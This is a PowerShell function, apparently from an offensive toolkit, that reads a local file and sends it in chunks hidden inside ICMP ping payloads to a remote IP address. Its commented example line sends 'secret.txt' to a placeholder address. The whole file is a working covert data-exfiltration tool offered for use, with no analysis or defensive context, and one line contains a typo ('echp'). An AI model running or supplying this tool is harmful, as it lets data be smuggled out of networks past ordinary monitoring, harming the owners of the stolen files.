function Icmp_Download_Reverse
{
  [CmdletBinding()] Param(

    [Parameter(Position = 0, Mandatory = $true)]
    [String]
    $IPAddress,

    [Parameter(Position = 1, Mandatory = $true)]
    [String]
    $Filename,

    [Parameter(Position = 2, Mandatory = $false)]
    [Int]
    $Size = 60000,

    [Parameter(Position = 2, Mandatory = $false)]
    [String]
    $FilenameDestination = ''

  )

  $SizeFilename = $Filename.Length
  $ICMPClient = New-Object System.Net.NetworkInformation.Ping
  $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
  $PingOptions.DontFragment = $True
  $Offset = 0
  $ReponseAll = New-Object System.Io.MemoryStream
  $Continue = $true
  $try = 0
  $bytes = [System.IO.File]::ReadAllBytes($Filename)
  if ([string]::IsNullOrEmpty($FilenameDestination)) {
    $FilenameDestination = $Filename
  }


  while ($Continue)
  {

    if ($Size -gt ($bytes.Count - $Offset))
    {
      $Size = $bytes.Count - $Offset
    }

    $stringToSend =  $bytes[$Offset..($Offset+$Size-1)]
    $OffsetBytes = [BitConverter]::GetBytes($Offset)
    $SizeBytes = [BitConverter]::GetBytes($Size)[0..1]
    $FilenameBytes = [BitConverter]::GetBytes($SizeFilename)[0..1]
    $sendbytes = $FilenameBytes + [text.encoding]::ASCII.GetBytes($FilenameDestination) + $OffsetBytes + $SizeBytes + $stringToSend
    $reply = $ICMPClient.Send($IPAddress,$Size, $sendbytes, $PingOptions)
    $Response = $reply.Buffer
    if ($Response)
    {
      write-host -NoNewline "+"
      $try = 0
      $Offset += $Size
      if ($Offset -eq $bytes.Count)
      {
        $Continue = $false
        echo ""
        echo "Terminated"
      }

    }
    else
    {
      write-host -NoNewline "-"
      $try += 1
      if ($try -gt 5)
      {
        echp ""
        echo "Server seems down"
        $Continue = $false
      }


    }

  }
}

#Icmp_Download_Reverse -IPAddress X.X.X.X -Filename secret.txt
